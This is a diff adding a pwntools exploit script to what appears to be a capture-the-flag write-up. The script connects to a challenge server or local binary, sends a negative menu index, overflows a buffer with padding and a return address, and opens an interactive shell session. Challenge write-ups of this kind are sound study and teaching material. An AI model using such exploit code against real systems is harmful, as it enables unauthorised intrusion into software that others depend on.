@@ -116,6 +116,38 @@ int perform_ritual()
 
 ### ex.py
 
-```
+```python
+from pwn import *
+import argparse
 
+parser = argparse.ArgumentParser()
+parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
+parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
+args = parser.parse_args()
+
+gdb_cmds = [
+    'b *$rebase(0x000000000001568)',
+    'c'
+]
+
+binary = './prob'
+ 
+context.binary = binary
+context.arch = 'amd64'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.remote:
+    p = remote("3.38.164.12", 3030)
+else:
+    p = process(binary)
+    if args.gdb:
+        gdb.attach(p, '\n'.join(gdb_cmds))
+
+p.sendlineafter(b'Choice: ', b'1')
+p.sendlineafter(b'Choice: ', b'-1')
+p.sendlineafter(b': ', b'a' * 0x20 + p64(0x40184d))
+p.sendlineafter(b'Choice: ', b'3')
+
+p.interactive()
 ```
